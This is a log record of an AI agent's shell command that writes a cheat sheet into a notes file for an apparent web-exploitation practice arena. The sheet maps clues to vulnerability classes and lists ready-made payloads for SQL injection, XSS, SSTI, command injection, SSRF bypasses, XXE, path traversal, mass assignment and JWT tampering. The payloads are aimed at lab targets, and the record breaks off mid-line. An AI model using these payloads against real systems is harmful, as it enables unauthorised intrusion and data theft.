{"type":"assistant","message":{"model":"claude-opus-5-5","id":"msg_011CgP1bARupKb6YiG1HzkNn","type":"message","role":"assistant","content":[{"type":"tool_use","id":"toolu_011j5PkMd92XZzEkyZBzyXgo","name":"Bash","input":{"command":"cd /home/testpwn/huntress-2026; python3 - <<'EOF'\np='reference/coverage/web.md'\ns=open(p).read()\ni=s.index('## Recognition cues (worker quick-reference)'); j=s.index('## Readiness gaps')\nnew='''## Recognition cues (worker quick-reference)\n\n```\nFIRST 60 SECONDS ON ANY TARGET (cheap, in parallel, curl --max-time 20 -A 'Mozilla/5.0'):\n  GET /api/clues   -> feature_route / secondary_route / current_role|current_user + ZERO or ONE concept key\n  GET each clue route BARE: the JSON error names the missing piece (session_id_required, post_required(405) = POST\n      sink, administrator_required(403), path_required, account_id_required, self_service_only; 404 not_found on a\n      GraphQL route = POST JSON instead). A *_guide_route / inventory_route JSON lists the next requests: read it.\n  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow\n  regex  proof_[0-9a-f]{32}  over EVERY body. An `effect` without the proof is NOT a solve (D12, D16 baseline).\n  Any file read (LFI, cmd, SSTI, XXE, file://): /run/huntress/config.json `weakness` names the class.\nPick routes by clue KEY, NEVER by the word in the value (process|execute|inspect|submit|result|audit re-dealt).\nNo concept key (D11-D13, D15) -> the prompt's verb names the bug; POST bodies: JSON first (D12 ignored form fields).\nQuery values: always --data-urlencode / %3B (Go/Gin drops a raw `;`). MASTERY: 4 targets, prompt = today's only.\n\nCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\nrobots Disallow, \"backup\", \"archive\"                   -> exposed backup     -> Disallow -> index -> .bak (depth 2)\n\"Signed in as\", /api/history ids                       -> IDOR               -> foreign id into the API template\nsearch box, \"database\"                                 -> SQLi               -> q=zz') OR 1=1 --  (+ quote-balanced, ' \" )) #)\n?doc=/?page=, \"stay inside\", \"mounted at /path\"        -> traversal          -> ../ x10 + /run/huntress/objective.txt\nfeature_route only, \"staff-only, just a sign\"          -> unprotected route  -> GET it\ncallback_nonce, \"repeats everything\"                   -> reflected XSS      -> ?q=<script>fetch('/cb?nonce=N')</script>, then GET /cb?nonce=N\n      with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\nmoderator_data_route + receipt_route_template          -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\nsession_hint, \"plant your session\"                     -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\npreferences_route, hidden csrf_token, \"even strangers\" -> CSRF (D09)         -> external option with Sec-Fetch-Site: cross-site, Mode: navigate,\n                                                                                Dest: document, foreign Referer; GET /api/preferences\nupload_shape/render_route, \"standards. Low ones\"       -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\",\n                                                                                content_type:\"text/html\"} -> GET the returned path\n\"evaluates everything\", empty \"Rendered message\" <pre> -> SSTI (D11)         -> ?template=a${7*7}b{{7*7}}c per param -> {{objective}}\n\"plant ... come back later\", post_required + rows:[]   -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"}, GET secondary\n\"API binds whatever you hand it\", administrator_required -> mass assignment  -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin,\n                                                                                admin, roles:[\"admin\"], access_level, permissions}; GET secondary\ninventory_route + protected_reference                  -> field/action authz -> feature?id=<protected>&fields=<f>&action=<a>, EVERY single f x a\n\"fetch anything you point it at\", absolute_url_required -> SSRF (D15)        -> feature?url=http://127.0.0.1:8080<secondary>; ladder :80 :5000 ..\n  + secondary internal_only\ninput_parameter + example_path, \"too close to a real   -> cmd injection(D16) -> feature?<param>=<example>%3Bcat%20/run/huntress/objective.txt\n  shell\", 400 path_required, JSON stdout                                        -> stdout line 2 (then %0a, &&, |, $() if ; is filtered)\nrecovery_guide_route, \"Forgot your password ...        -> reset token (D17)  -> GET guide; request_route?account_id=<self_service id> -> token;\n  somebody else's account\", self_service_only                                   redeem_route?token=<it>&account_id=<other id> -> evidence\nprotected_reference + note \"checked by each resolver\", -> GraphQL (D18)      -> POST JSON {\"query\":\"{__schema{..}}\"}; then {caseIndex{id title\n  \"Discover the schema\", GET 404 not_found                                      visibility} case(id:\"<prot>\"){id title note}} -> note\ncurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to admin (cookie, header, claim)\neyJ..eyJ..sig in cookie/Authorization                 -> JWT                -> alg none / leaked secret, role claim\notp/verify/step 2, \"second factor\", \"remember me\"      -> MFA step skip      -> call the final step with the step-1 session; omit/reuse the code\nlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host\nSSRF filtered (blocked_host / scheme_not_allowed)      -> SSRF sequel        -> 2130706433, 127.1, [::1], allowed@127.0.0.1, file:///run/...\n/api/v1 vs /v2, \"legacy\", \"beta\"; ws:// in JS          -> shadow API / WS    -> the protected op on every version / transport (same authz?)\n\"internal only\", \"localhost only\"                      -> header trust       -> X-Forwarded-For: 127.0.0.1 (+ X-Original-URL)\nXML/SVG/DOCX upload                                    -> XXE                -> <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">\n\"__proto__\", JSON merge \"settings\", Node banner        -> prototype pollution -> {\"__proto__\":{\"isAdmin\":true}} then re-read secondary\nA real victim browser exists (D07): \"the admin/reviewer visits\" runs your JS with their cookies (receipts >12 s).\n\"Browser\"/\"stranger\" checks without a bot (D06, D09) = send the Sec-Fetch-* + Referer/Origin matrix yourself.\nNEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11 did -> TT first try;\nD09-D10, D12-D13, D15-D18 TT went solver_incomplete). Banners are costume; the title pun names the bug.\n```\n\n'''\ns=s[:i]+new+s[j:]\nopen(p,'w').write(s)\na=s.index('## Recognition cues'); b=s.index('## Readiness gaps')\nprint(s[a:b].count('\\n'))\nEOF","description":"Rewrite recognition cues block in atlas"},"caller":{"type":"direct"}}],"container":null,"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":2,"cache_creation_input_tokens":424,"cache_read_input_tokens":105666,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":424},"output_tokens":8,"service_tier":"standard","inference_geo":"global","speed":"standard"},"input_transformations":[],"diagnostics":null,"context_management":null},"parent_tool_use_id":null,"session_id":"2f22de87-85c6-4735-9cd3-ecbd50af08de","uuid":"bb2ef54b-0934-42b0-89ba-61ef79e8b57d","timestamp":"2026-10-25